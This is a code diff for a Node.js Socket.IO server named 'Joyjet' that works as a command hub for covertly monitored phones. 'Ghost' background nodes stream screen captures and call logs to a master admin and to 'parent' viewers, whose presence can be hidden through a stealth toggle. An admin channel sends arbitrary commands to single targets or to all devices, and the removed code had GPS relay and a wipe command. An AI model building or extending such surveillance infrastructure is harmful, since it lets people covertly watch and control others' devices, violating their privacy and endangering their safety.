@@ -8,81 +8,88 @@ const app = express();
 const server = http.createServer(app);
 
 // 1. HIGH-PERFORMANCE ENGINE CONFIG
-// 100MB buffer for HD frames + optimized ping for mobile stability
+// HD frames require larger buffer. Origin "*" is necessary for mobile apps.
 const io = new Server(server, {
-  maxHttpBufferSize: 1e8, 
-  pingInterval: 10000,
+  maxHttpBufferSize: 1e8, // 100MB for HD frames
+  pingInterval: 10000,    // Faster detection of mobile disconnects
   pingTimeout: 5000,
-  cors: { origin: "*" }
+  cors: {
+    origin: "*", 
+    methods: ["GET", "POST"],
+    credentials: true
+  }
 });
 
-// 2. SECURITY & CONFIG
-const PUBLIC_URL = "https://joyjet-server.onrender.com";
+// 2. STATE MANAGEMENT
+const PUBLIC_URL = process.env.PUBLIC_URL || "https://joyjet-server.onrender.com";
 const ADMIN_KEY = process.env.ADMIN_SECRET_KEY; 
-let viewers = new Map(); // Tracks active viewer sessions
+let viewers = new Map(); // Store viewer state { name, hidden, socketId }
 
-// 3. RENDER KEEP-ALIVE (Self-Heartbeat)
+// 3. RENDER.COM KEEP-ALIVE
+// Prevents the server from "sleeping" on the free tier
 setInterval(async () => {
   try {
     await axios.get(PUBLIC_URL);
-    console.log('Heartbeat: System Active');
+    console.log('--- System Heartbeat: Success ---');
   } catch (err) {
-    console.log('Heartbeat: Pulse Sent');
+    console.log('--- System Heartbeat: Pulse Sent ---');
   }
-}, 600000); // 10 Minutes
+}, 840000); // 14 Minutes (Render timeout is 15 mins)
 
 // 4. MAIN COMMUNICATIONS HUB
 io.on('connection', (socket) => {
-  console.log('Node Linked:', socket.id);
+  console.log(`[Link] Connected: ${socket.id}`);
 
-  // DYNAMIC ROLE & PERMISSION SYSTEM
+  // ROLE & PERMISSION SYSTEM
   socket.on('claim_role', (data) => {
+    if (!data.name) return;
     const nameLower = data.name.trim().toLowerCase();
     const providedKey = data.key;
 
-    // A. ADMIN AUTHENTICATION
+    // A. ADMIN: Full System Access
     if (nameLower === "admin") {
       if (providedKey === ADMIN_KEY) {
         socket.join("admin_room");
         socket.emit('role_assigned', { role: 'ADMIN', name: "SYSTEM_MASTER" });
-        console.log("Admin Authorized.");
+        console.log(`[Auth] Admin Access Granted: ${socket.id}`);
       } else {
         socket.emit('system_alert', { msg: "ACCESS DENIED: INVALID KEY" });
         socket.disconnect();
       }
     } 
-    // B. VIEWER LOGIC (Parent - No underscore)
+    // B. VIEWER: Parent Monitoring
     else if (!nameLower.includes('_')) {
       viewers.set(socket.id, { name: nameLower, hidden: false });
       socket.join(`viewer_room_${nameLower}`);
       socket.emit('role_assigned', { role: 'VIEWER', name: data.name });
-      console.log(`Viewer [${data.name}] monitoring assigned nodes.`);
+      console.log(`[Auth] Viewer Registered: ${data.name}`);
     } 
-    // C. GHOST LOGIC (Child Node - Has underscore)
+    // C. GHOST: Background Node
     else {
+      socket.join("ghost_nodes");
       socket.emit('role_assigned', { role: 'GHOST', name: data.name });
-      // Alert Admin that a node is active
-      io.to("admin_room").emit('system_alert', { msg: `Node [${data.name}] Online.` });
+      io.to("admin_room").emit('system_alert', { msg: `Node [${data.name}] is now Online.` });
     }
   });
 
-  // STEALTH TOGGLE (For Viewers)
+  // STEALTH MODE: Toggle for Viewers
   socket.on('toggle_visibility', (data) => {
     if (viewers.has(socket.id)) {
         let v = viewers.get(socket.id);
         v.hidden = data.hidden;
         viewers.set(socket.id, v);
+        console.log(`[Privacy] ${v.name} Visibility: ${data.hidden ? 'Hidden' : 'Visible'}`);
     }
   });
 
-  // HIGH-QUALITY HD RELAY (Ghost -> Admin/Viewer)
+  // SCREEN RELAY: Optimized for high-frequency data
   socket.on('screen_frame', (payload) => {
-    // payload: { ghostName: "Alpha_01", frame: "base64..." }
+    // payload: { ghostName: string, frame: base64 }
     
-    // 1. Always relay to Admin (using volatile for lag-free performance)
+    // Relay to Admin (Volatile = don't queue if laggy)
     io.to("admin_room").volatile.emit('screen_frame', payload);
     
-    // 2. Relay to specific Parent (Viewer)
+    // Relay to assigned Parent (Viewer)
     viewers.forEach((vData, vSocketId) => {
       if (!vData.hidden) {
         const prefix = vData.name + "_";
@@ -93,35 +100,9 @@ io.on('connection', (socket) => {
     });
   });
 
-  // GPS & SENSOR RELAY
-  socket.on('ghost_location_data', (payload) => {
-    io.to("admin_room").emit('ghost_update', payload);
-    viewers.forEach((vData, vSocketId) => {
-      const prefix = vData.name + "_";
-      if (payload.ghostName.toLowerCase().startsWith(prefix)) {
-        io.to(`viewer_room_${vData.name}`).emit('ghost_update', payload);
-      }
-    });
-  });
-
-  // COMMAND RELAY (Admin -> Ghost/Global)
-  socket.on('admin_wipe', (targetId) => {
-    // Security check: only if sender is in admin_room
-    if (socket.rooms.has("admin_room")) {
-        io.to(targetId).emit('admin_command', 'WIPE_SERVICE');
-    }
-  });
-
-  socket.on('admin_command', (cmd) => {
-    if (socket.rooms.has("admin_room")) {
-        socket.broadcast.emit('admin_command', cmd);
-    }
-  });
-
-  // MONITOR GHOST PHONE CALL LOGS
-socket.on('ghost_activity', (payload) => {
+  // SENSOR & ACTIVITY SYNC
+  socket.on('ghost_activity', (payload) => {
     if (payload.type === 'CALL_LOG_SYNC') {
-        // Unpack the logs and send them to the Admin individually
         payload.data.forEach(call => {
             const logEntry = {
                 timestamp: new Date().toLocaleTimeString(),
@@ -131,21 +112,31 @@ socket.on('ghost_activity', (payload) => {
             io.to('admin_room').emit('activity_log', logEntry);
         });
     } else {
-        // Standard activity
         io.to('admin_room').emit('activity_log', payload);
     }
-});
+  });
 
+  // COMMAND SYSTEM: Admin -> Target
+  socket.on('admin_command', (data) => {
+    // data: { targetId: string, cmd: string }
+    if (socket.rooms.has("admin_room")) {
+        if (data.targetId) {
+            io.to(data.targetId).emit('admin_command', data.cmd);
+        } else {
+            socket.broadcast.emit('admin_command', data.cmd);
+        }
+    }
+  });
 
-  // DISCONNECT CLEANUP
+  // CLEANUP
   socket.on('disconnect', () => {
     viewers.delete(socket.id);
-    console.log('Node Unlinked:', socket.id);
+    console.log(`[Unlink] Disconnected: ${socket.id}`);
   });
 });
 
-// SERVER ENTRY POINT
-app.get('/', (req, res) => res.send('Joyjet HQ: Secure Hub Operational'));
+// BASE ENDPOINT
+app.get('/', (req, res) => res.send('Joyjet Hub: Active'));
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Master Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`>>> MASTER HUB OPERATIONAL ON PORT ${PORT} <<<`));
